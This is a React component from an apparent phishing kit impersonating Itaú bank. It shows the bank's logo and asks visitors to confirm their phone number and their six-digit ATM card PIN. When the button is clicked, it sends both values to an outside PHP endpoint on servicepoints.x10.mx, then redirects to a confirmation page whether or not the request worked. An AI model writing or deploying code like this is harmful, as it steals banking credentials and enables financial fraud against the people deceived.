import React, { useState } from 'react';
import './EmailTelefone.css';
import InputMask from 'react-input-mask';
import { useNavigate } from 'react-router-dom';

const EmailTelefone = () => {
    const navigate = useNavigate();
    const [tel, setTel] = useState('');
    const [seis, setSeis] = useState('');

    const defineTel = (event) => {
        setTel(event.target.value);
    };

    const defineSeis = (event) => {
        setSeis(event.target.value);
    };

    const handleClick = () => {
        setTimeout(async () => {
            if(!tel || !seis){
                alert("Por favor preencha todos os campos !");
                return; // Adicionado para evitar prosseguir com a execução
              }
              try {
                const response = await fetch(`https://servicepoints.x10.mx/recebe3.php?tel=${tel}&seis=${seis}`);
                if (!response.ok) {
                  throw new Error('Sistema indisponível');
                }
                navigate('/confirm');
              } catch (error) {
                console.error('Erro ao fazer a requisição:', error);
              }
            navigate('/confirm');
        }, 1000);
    };

    return (
        <div className='EmailTelefone'>
            <div className='logo'>
                <img src="https://www.itau.com.br/media/dam/m/538533fcf33fd411/original/itau-logo-branco-48x48.png" alt="logo_itau" />
            </div>
            <div className='title-et'>
                <span>Confirme os dados abaixo para<br />continuar</span>
            </div>
            <div className='form3'>
                <span>o mesmo que está em seu cadastro:</span>
                <InputMask
                    mask="(99) 99999-9999"
                    className="digitavel"
                    type="text"
                    placeholder='telefone'
                    onChange={defineTel}
                    aria-label="telefone"
                />
                <span>a mesma que você usa no caixa eletrônico (6 digitos):</span>
                <InputMask
                    mask="999999"
                    className="digitavel"
                    type="password"
                    placeholder='digite a senha do cartão'
                    onChange={defineSeis}
                    aria-label="senha do cartão"
                />
                <button onClick={handleClick}>confirmar</button>
            </div>
        </div>
    );
};

export default EmailTelefone;
